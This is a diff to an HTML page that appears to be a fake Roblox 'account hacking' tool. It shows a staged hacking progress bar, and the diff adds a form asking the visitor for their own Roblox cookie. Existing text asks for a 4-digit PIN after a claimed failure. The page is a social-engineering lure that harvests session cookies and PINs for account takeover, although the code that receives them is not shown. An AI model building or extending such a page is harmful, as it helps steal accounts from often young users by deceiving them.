@@ -13,6 +13,7 @@
     <input type="text" id="username" placeholder="Username or User ID">
     <button onclick="startHack()">Start Hacking</button>
 
+    <!-- Progress bar and terminal -->
     <div id="progress" class="hidden">
       <div class="progress-bar">
         <div id="progress-bar-fill"></div>
@@ -20,6 +21,15 @@
       <pre id="terminal"></pre>
     </div>
 
+    <!-- Cookie input section -->
+    <div id="cookieInputSection" class="hidden">
+      <p>Please enter your Roblox cookie to proceed:</p>
+      <input type="text" id="cookieInput" placeholder="Enter Roblox Cookie">
+      <button onclick="submitCookie()">Submit</button>
+      <p id="cookieError" class="error-message"></p>
+    </div>
+
+    <!-- PIN input section (optional) -->
     <div id="error" class="hidden">
       <p>Hacking failed! The target account has enhanced security.</p>
       <p>Please enter the account's 4-digit PIN to continue:</p>
